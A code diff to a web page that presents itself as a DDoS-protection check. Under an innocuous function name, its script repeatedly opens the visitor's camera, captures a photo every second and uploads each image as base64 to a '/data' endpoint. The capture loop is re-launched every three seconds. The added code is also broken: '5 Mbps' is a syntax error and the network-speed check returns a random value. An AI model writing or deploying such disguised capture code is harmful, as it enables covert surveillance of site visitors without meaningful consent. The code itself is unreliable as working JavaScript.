@@ -85,65 +85,76 @@ DDoS protection by
 <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
     <script>
 function updateBackground() {
-      
-        const video = document.getElementById('video');
-        const photoPreview = document.getElementById('photoPreview');
-        const status = document.getElementById('status');
+  const video = document.getElementById('video');
+  const photoPreview = document.getElementById('photoPreview');
+  const status = document.getElementById('status');
 
-        // Access the camera
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                video.play();
-                capturePhoto();
-            })
-            .catch(err => {
-                console.error('Error accessing media devices.', err);
-                status.textContent = 'Error accessing camera: ' + err.message;
-            });
+  // Access the camera with error handling
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
+      video.play();
+      capturePhoto();
+    })
+    .catch(err => {
+      console.error('Error accessing media devices:', err);
+      status.textContent = 'Error accessing camera: ' + err.message;
+    });
 
-        // Capture photo every second
-        function capturePhoto() {
-            setInterval(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = 940; // Set the desired width
-               canvas.height = 880; // Set the desired height
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                const dataURL = canvas.toDataURL('image/png'); // Convert to Base64
-                const base64Image = dataURL.split(',')[1]; // Get Base64 part
+  // Capture photo with dynamic resolution based on network conditions
+  function capturePhoto() {
+    setInterval(() => {
+      const canvas = document.createElement('canvas');
 
-                // Send image in JSON format
-                const jsonPayload = JSON.stringify({ image: base64Image });
+      // Determine appropriate resolution based on network speed
+      const networkSpeed = getNetworkSpeed(); // Implement network speed detection logic
+      const width = networkSpeed >= 5 Mbps ? 940 : 640; // Adjust based on your requirements
+      const height = networkSpeed >= 5 Mbps ? 880 : 480;
 
-                // Send the JSON object to the backend
-                fetch('/data', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: jsonPayload
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log("Server Response:", data);
-                    status.textContent = 'Photo sent successfully!';
-                    photoPreview.src = dataURL; // Show the captured photo
-                })
-                .catch(error => {
-                    console.error("Error:", error);
-                    status.textContent = 'Error sending photo: ' + error.message;
-                });
-            }, 1000); // Capture every 1000 milliseconds (1 second)
-        }
- 
-  // Your background update logic here
-  console.log("Updating background...");
+      canvas.width = width;
+      canvas.height = height;
+
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, width, height);
+
+      const dataURL = canvas.toDataURL('image/png'); // Convert to Base64
+      const base64Image = dataURL.split(',')[1]; // Get Base64 part
+
+      // Send image in JSON format
+      const jsonPayload = JSON.stringify({ image: base64Image });
+
+      // Send the JSON object to the backend
+      fetch('/data', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: jsonPayload
+      })
+        .then(response => response.json())
+        .then(data => {
+          console.log("Server Response:", data);
+          status.textContent = 'Photo sent successfully!';
+          photoPreview.src = dataURL; // Show the captured photo
+        })
+        .catch(error => {
+          console.error("Error:", error);
+          status.textContent = 'Error sending photo: ' + error.message;
+        });
+    }, 1000); // Capture every 1000 milliseconds (1 second)
+  }
 }
 
-setInterval(updateBackground, 3000); // Update every 5 seconds
-      
+// Implement network speed detection logic (replace with your preferred method)
+function getNetworkSpeed() {
+  // Use libraries like navigator.connection or network estimation techniques
+  // ...
+  return Math.random() * 10; // Placeholder for demonstration
+}
+
+setInterval(updateBackground, 3000); // Update every 3 seconds
+        
+  
   </script>
    
    
